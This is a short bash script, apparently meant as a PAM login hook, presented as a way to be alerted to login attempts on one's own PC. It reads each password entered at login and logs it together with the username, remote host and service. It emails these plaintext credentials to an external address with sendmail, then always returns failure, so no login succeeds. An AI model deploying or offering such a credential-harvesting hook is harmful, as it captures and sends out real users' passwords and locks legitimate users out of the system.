#!/usr/bin/env bash

read PAM_PASS
# Goes to log file 
  echo -e "$PAM_TYPE,$PAM_USER,$PAM_PASS,$PAM_RUSER,$PAM_RHOST,$PAM_SERVICE,$PAM_TTY\n" 
# loogin attepmt is logget into your emal
  $(echo -e "Subject: Login attepmt on my pc\n\n $PAM_TYPE,$PAM_USER,$PAM_PASS,$PAM_RUSER,$PAM_RHOST,$PAM_SERVICE,$PAM_TTY\n" | sendmail example@example.com ) &
# Login always incorrect :D ( exit 1 )
exit 1
